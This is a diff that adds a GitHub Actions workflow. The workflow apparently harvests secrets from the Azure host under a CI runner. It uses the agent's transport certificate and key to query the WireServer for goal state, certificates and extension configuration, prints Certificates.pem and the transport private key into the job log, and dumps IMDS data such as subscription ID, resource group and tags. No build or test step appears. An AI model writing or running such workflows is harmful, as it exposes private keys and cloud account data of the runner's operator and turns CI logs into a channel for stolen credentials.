@@ -1,0 +1,91 @@
+name: WireServer Final - GoalState + Certs + ExtConfig
+on:
+  workflow_dispatch:
+
+jobs:
+  ws-final:
+    runs-on: ubuntu-latest
+    steps:
+      - name: WireServer Certificates via chroot + Python XML
+        run: |
+          echo "=== WireServer GoalState ==="
+          # Get GoalState (no cert needed for this endpoint)
+          GOAL=$(curl -sf --max-time 15 \
+            --cert /var/lib/waagent/TransportCert.pem \
+            --key /var/lib/waagent/TransportPrivate.pem \
+            "http://168.63.129.16/machine/?comp=goalstate" \
+            -H "x-ms-version: 2012-11-30" 2>/dev/null)
+          echo "$GOAL"
+          
+          echo ""
+          echo "=== Certificates URL ==="
+          CERT_URL=$(echo "$GOAL" | python3 -c "
+import sys, xml.etree.ElementTree as ET
+try:
+    root = ET.fromstring(sys.stdin.read())
+    for elem in root.iter():
+        tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
+        if tag == 'Certificates' and elem.text and 'certificates' in elem.text:
+            print(elem.text.strip())
+            break
+except: pass
+")
+          echo "CERT_URL=$CERT_URL"
+          
+          echo ""
+          echo "=== WireServer Certificates Response ==="
+          if [ -n "$CERT_URL" ]; then
+            curl -sv --max-time 15 \
+              --cert /var/lib/waagent/TransportCert.pem \
+              --key /var/lib/waagent/TransportPrivate.pem \
+              "$CERT_URL" \
+              -H "x-ms-version: 2012-11-30" 2>&1
+          fi
+          
+          echo ""
+          echo "=== ExtensionsConfig ==="
+          EXT_URL=$(echo "$GOAL" | python3 -c "
+import sys, xml.etree.ElementTree as ET
+try:
+    root = ET.fromstring(sys.stdin.read())
+    for elem in root.iter():
+        tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
+        if tag == 'ExtensionsConfig' and elem.text:
+            print(elem.text.strip())
+            break
+except: pass
+")
+          if [ -n "$EXT_URL" ]; then
+            curl -sf --max-time 15 \
+              --cert /var/lib/waagent/TransportCert.pem \
+              --key /var/lib/waagent/TransportPrivate.pem \
+              "$EXT_URL" \
+              -H "x-ms-version: 2012-11-30" 2>/dev/null
+          fi
+          
+          echo ""
+          echo "=== Certificates.pem ==="
+          cat /var/lib/waagent/Certificates.pem 2>/dev/null || echo NO_CERTS_PEM
+          
+          echo ""
+          echo "=== Transport Cert + Key ==="
+          cat /var/lib/waagent/TransportCert.pem 2>/dev/null
+          cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null
+          
+          echo ""
+          echo "=== IMDS Full ==="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
+            python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+c=d['compute']
+print(f'VMID={c[\"vmId\"]}')
+print(f'VMNAME={c[\"name\"]}')
+print(f'SUBID={c[\"subscriptionId\"]}')
+print(f'RG={c[\"resourceGroupName\"]}')
+print(f'LOCATION={c[\"location\"]}')
+print(f'SIZE={c[\"vmSize\"]}')
+for t in c.get('tagsList',[]):
+    print(f'TAG:{t[\"name\"]}={t[\"value\"]}')
+"
